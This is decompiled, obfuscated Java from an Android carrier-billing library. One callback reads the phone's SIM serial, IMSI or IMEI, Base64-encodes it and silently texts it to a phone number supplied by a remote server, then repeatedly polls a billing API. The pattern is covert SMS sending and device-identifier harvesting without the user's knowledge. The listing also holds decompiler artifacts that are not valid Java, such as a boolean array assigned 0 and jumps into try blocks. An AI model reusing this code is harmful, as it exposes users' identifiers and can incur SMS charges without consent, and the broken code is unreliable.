package com.upay.billing.utils;

import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import com.upay.billing.UpayConstant;
import org.json.JSONException;
import org.json.JSONObject;

final class m
  extends HttpRunner
{
  m(String paramString, TelephonyManager paramTelephonyManager, Context paramContext)
  {
    super(paramString);
  }
  
  protected void onFailed(int paramInt, String paramString)
  {
    super.onFailed(paramInt, paramString);
  }
  
  protected void onSuccess(byte[] paramArrayOfByte)
  {
    for (;;)
    {
      String str;
      Object localObject1;
      try
      {
        paramArrayOfByte = new JSONObject(Util.bytesToString(paramArrayOfByte));
        if (paramArrayOfByte.getInt("result") != 200) {
          return;
        }
        str = paramArrayOfByte.getString("num");
        localObject2 = this.val$telephonyManager.getSimSerialNumber();
        paramArrayOfByte = "";
        if (!Util.empty((String)localObject2))
        {
          localObject1 = localObject2;
          if (((String)localObject2).length() >= 16) {}
        }
        else
        {
          localObject1 = this.val$telephonyManager.getSubscriberId();
          paramArrayOfByte = "imsi:";
        }
        if (!Util.empty((String)localObject1)) {
          break label317;
        }
        paramArrayOfByte = this.val$telephonyManager.getDeviceId();
        localObject1 = "imei:";
        if (Util.empty(paramArrayOfByte))
        {
          Log.e("Util", "cannot find any device info");
          return;
        }
      }
      catch (JSONException paramArrayOfByte)
      {
        paramArrayOfByte.printStackTrace();
        return;
      }
      Object localObject2 = Base64.encodeToString(Util.stringToBytes("{\"iccid\":\"" + (String)localObject1 + paramArrayOfByte + "\"}"), 0);
      SmsManager.getDefault().sendTextMessage(str, null, "up://" + (String)localObject2, null, null);
      int i = 30;
      localObject2 = new boolean[1];
      localObject2[0] = 0;
      label203:
      int j = i - 1;
      if ((i > 0) && (localObject2[0] == 0))
      {
        Log.i("Util", "cnt=" + j + ",out=" + localObject2[0]);
        try
        {
          Thread.sleep(3000L);
          Util.addTask(new n(this, UpayConstant.API_BASE_URL + "user/show" + "?iccid=" + (String)localObject1 + paramArrayOfByte, (boolean[])localObject2).setDoGet());
          i = j;
          break label203;
          label317:
          localObject2 = paramArrayOfByte;
          paramArrayOfByte = (byte[])localObject1;
          localObject1 = localObject2;
        }
        catch (InterruptedException localInterruptedException)
        {
          for (;;) {}
        }
      }
    }
  }
}
